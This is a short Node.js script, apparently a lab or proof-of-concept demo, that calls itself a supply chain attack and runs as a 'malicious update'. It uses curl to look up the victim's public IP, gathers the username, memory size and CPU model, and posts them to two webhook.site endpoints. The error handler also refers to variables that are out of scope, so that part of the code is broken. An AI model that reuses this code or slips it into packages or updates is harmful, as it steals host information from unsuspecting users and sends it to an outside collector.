const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK - KALI LINUX');
console.log('🔍 Malicious update triggered!');

try {
  const ip = execSync('curl -s ifconfig.me').toString().trim();
  const user = os.userInfo().username;
  
  console.log(`🎯 VICTIM: ${ip} (user: ${user})`);
  
  // FIRST PAYLOAD
  execSync(`curl -X POST https://webhook.site/b750c037-0ad2-4d73-998e-12dd15f5d672 -d "ip=${ip}&user=${user}&os=linux&attack=supplychain"`);
  
  // SECOND PAYLOAD (more data)
  const payload2 = `ip=${ip}&user=${user}&memory=${Math.round(os.totalmem()/1073741824)}GB&cpu=${os.cpus()[0].model}`;
  execSync(`curl -X POST https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439 -d "${payload2}"`);
  
  console.log('✅ DOUBLE ATTACK SUCCESS!');
} catch (error) {
  console.log('📤 SIMULATED EXFIL');
  console.log(`STOLEN: IP=${ip}, user=${user}`);
}
